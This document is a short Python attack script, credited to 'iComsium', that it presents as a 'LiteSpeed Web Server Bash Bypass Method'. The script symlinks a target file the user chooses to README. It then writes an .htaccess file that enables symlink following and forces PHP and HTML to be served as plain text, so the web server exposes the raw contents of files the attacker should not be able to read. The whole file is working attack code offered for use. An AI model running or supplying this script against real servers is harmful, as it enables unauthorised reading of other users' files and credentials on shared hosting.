#/
#* Project : LiteSpeed Web Server Bash Bypass Method
#* Author  : iComsium
#* Website : www.fb.com/ico.phtml
#/

import os,sys

try:
	os.system("rm -rf Lite0day")
	os.mkdir("Lite0day")
	os.system("chmod +x Lite0day")
	os.chdir("Lite0day")
	with open("lite.sh","w") as bypass:
		bypass.write("ln -s " + sys.argv[1] + " README")
	with open(".htaccess","w") as htaccess:
		htaccess.write("OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI\nOptions Indexes FollowSymLinks\nForceType text/plain\nAddType text/plain .php\nAddType text/plain .html\nAddType text/html .shtml\nAddType txt .php\nAddHandler server-parsed .php\nAddHandler txt .php\nAddHandler txt .html\nAddHandler txt .shtml\nOptions All\nReadMeName README")
	os.system("chmod +x lite.sh")
	os.system("./lite.sh")
	os.system("rm -rf lite.sh")
	print("#/\n#* Project : LiteSpeed Web Server Bash Bypass Method\n#* Author  : iComsium\n#* \n#* Website : www.facebook.com/ico.phtml\n#/\n\n[+] Bypassed Successfully!\n[!] Please check Lite0day folder!")
except:
	print("Please enter your target file! Use : python lite0day.py /folder/file.ext")
